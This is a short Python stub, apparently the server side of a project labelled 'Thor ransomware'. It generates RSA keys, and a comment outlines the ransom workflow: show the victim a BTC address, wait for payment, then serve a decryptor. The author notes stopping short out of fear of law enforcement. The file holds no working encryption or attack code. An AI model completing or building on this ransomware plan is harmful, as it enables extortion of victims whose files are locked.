# Date: 11/03/2019
# Author: Mohamed
# Description: Thor ransomware

import os
import server.lib.const as const
from server.lib.crypto import CryptoRSA


# check if RSA keys exist
if not os.path.exists(const.RSA_PRIVATE_KEY) or not os.path.exists(const.RSA_PUBLIC_KEY):
    publ, priv = CryptoRSA.gen_keys()
    CryptoRSA.save(publ, priv)


if __name__ == '__main__':
    # This is as far as I can carry you.
    # I don't want the feds at my door.
    # Please, don't do anything dumb.

    # web server stuff
    '''
    1. Generate and sign with server RSA private key a new path on web server
    2. When that path is visited display a the target BTC address to the victim 
    3. Wait until a certain amount of BTC is sent to that BTC address 
    4. Generate a decryptor and wait for victim to hit that url path again 
    5. Let victim download decryptor
    '''
    ...
